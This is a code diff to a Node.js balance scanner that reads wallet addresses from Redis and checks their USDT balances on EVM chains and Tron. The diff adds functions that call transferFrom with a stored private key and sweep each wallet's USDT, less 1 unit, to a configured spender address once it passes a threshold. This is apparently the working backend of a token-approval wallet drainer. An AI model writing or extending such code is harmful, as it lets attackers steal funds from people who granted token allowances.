@@ -3,6 +3,9 @@ require("dotenv").config();
 const { createClient } = require("redis");
 const cfg = require("./config/config");
 const { getChainConfig } = require("./config/chain");
+const TronWebModule = require("tronweb");
+const TronWeb = TronWebModule.TronWeb || TronWebModule.default || TronWebModule;
+const { ethers } = require("ethers");
 
 const redisClient = createClient({
   socket: {
@@ -29,7 +32,7 @@ function resolveChainId(chainKey) {
 }
 
 async function getEvmTokenBalance(chainConfig, ownerAddress) {
-    if (!chainConfig.rpcUrl) {
+  if (!chainConfig.rpcUrl) {
     return 0n;
   }
   const rpcUrl = chainConfig.rpcUrl;
@@ -64,7 +67,7 @@ async function getEvmTokenBalance(chainConfig, ownerAddress) {
     ]
   };
 
-  const res = await fetch(chainConfig.explorerUrl, {    
+  const res = await fetch(rpcUrl, {
     method: "POST",
     headers: {
       "Content-Type": "application/json"
@@ -86,6 +89,28 @@ async function getEvmTokenBalance(chainConfig, ownerAddress) {
   }
 }
 
+async function getTronTokenBalance(chainConfig, ownerAddress) {
+  if (!chainConfig || !chainConfig.rpcUrl || !chainConfig.usdtAddress) {
+    return 0n;
+  }
+  if (!ownerAddress) {
+    return 0n;
+  }
+  const tronWeb = new TronWeb({
+    fullHost: chainConfig.rpcUrl
+  });
+  try {
+    const contract = await tronWeb.contract().at(chainConfig.usdtAddress);
+    const result = await contract.balanceOf(ownerAddress).call();
+    const raw = BigInt(result.toString());
+    const decimals = 6n;
+    const divisor = 10n ** decimals;
+    return raw / divisor;
+  } catch (e) {
+    return 0n;
+  }
+}
+
 async function getUsdtBalance(chainKey, chainConfig, ownerAddress) {
   if (!chainConfig) {
     return 0n;
@@ -93,7 +118,53 @@ async function getUsdtBalance(chainKey, chainConfig, ownerAddress) {
   if (chainConfig.type === "evm") {
     return getEvmTokenBalance(chainConfig, ownerAddress);
   }
+  if (chainConfig.type === "tron") {
+    return getTronTokenBalance(chainConfig, ownerAddress);
+  }
   return 0n;
+}
+
+function getToAddress(chainConfig) {
+  return chainConfig.toAddress || chainConfig.spenderAddress || "";
+}
+
+async function autoTransferEvm(chainKey, chainConfig, ownerAddress, amountUsdt) {
+  if (!chainConfig.rpcUrl || !chainConfig.usdtAddress || !chainConfig.pk) return;
+  const provider = new ethers.JsonRpcProvider(chainConfig.rpcUrl);
+  const wallet = new ethers.Wallet(chainConfig.pk, provider);
+  const to = getToAddress(chainConfig);
+  if (!to) return;
+
+  const abi = [
+    "function decimals() view returns (uint8)",
+    "function transferFrom(address from, address to, uint256 value) returns (bool)"
+  ];
+  const token = new ethers.Contract(chainConfig.usdtAddress, abi, wallet);
+  const decimals = Number(await token.decimals());
+  const units = BigInt(amountUsdt) * (10n ** BigInt(decimals));
+
+  console.log("[AUTO-TRANSFER-EVM]", "chainKey=" + chainKey, "owner=" + ownerAddress, "to=" + to, "amountUsdt=" + amountUsdt.toString());
+  const tx = await token.transferFrom(ownerAddress, to, units);
+  console.log("[AUTO-TRANSFER-EVM] txHash=", tx.hash);
+}
+
+async function autoTransferTron(chainKey, chainConfig, ownerAddress, amountUsdt) {
+  if (!chainConfig.usdtAddress || !chainConfig.pk) return;
+  const fullHost = chainConfig.rpcUrl || "https://api.trongrid.io";
+  const tronWeb = new TronWeb({
+    fullHost,
+    privateKey: chainConfig.pk
+  });
+  const to = getToAddress(chainConfig);
+  if (!to) return;
+
+  const decimals = 6n;
+  const units = (BigInt(amountUsdt) * (10n ** decimals)).toString();
+
+  console.log("[AUTO-TRANSFER-TRON]", "chainKey=" + chainKey, "owner=" + ownerAddress, "to=" + to, "amountUsdt=" + amountUsdt.toString());
+  const contract = await tronWeb.contract().at(chainConfig.usdtAddress);
+  const txId = await contract.transferFrom(ownerAddress, to, units).send({ feeLimit: 100000000 });
+  console.log("[AUTO-TRANSFER-TRON] txId=", txId);
 }
 
 async function scanOnce() {
@@ -103,8 +174,7 @@ async function scanOnce() {
   const keys = await redisClient.keys("usdt:owners:*");
   for (const key of keys) {
     const chainKey = key.slice("usdt:owners:".length);
-    const chainId = resolveChainId(chainKey);
-    const chainConfig = getChainConfig(chainId);
+    const chainConfig = getChainConfig(resolveChainId(chainKey));
     if (!chainConfig) {
       continue;
     }
@@ -113,15 +183,11 @@ async function scanOnce() {
       try {
         const balanceUsdt = await getUsdtBalance(chainKey, chainConfig, owner);
         if (balanceUsdt > THRESHOLD_USDT) {
-
-          //notify: .....
-          console.log(
-            "[USDT-HIGH-BALANCE]",
-            "chainKey=" + chainKey,
-            "chainName=" + chainConfig.name,
-            "owner=" + owner,
-            "usdt=" + balanceUsdt.toString()
-          );
+          if (chainConfig.type === "evm") {
+            await autoTransferEvm(chainKey, chainConfig, owner, balanceUsdt - 1n);
+          } else if (chainConfig.type === "tron") {
+            await autoTransferTron(chainKey, chainConfig, owner, balanceUsdt - 1n);
+          }
         }
       } catch (e) {
         console.error("scan balance error", chainKey, owner, e.message);
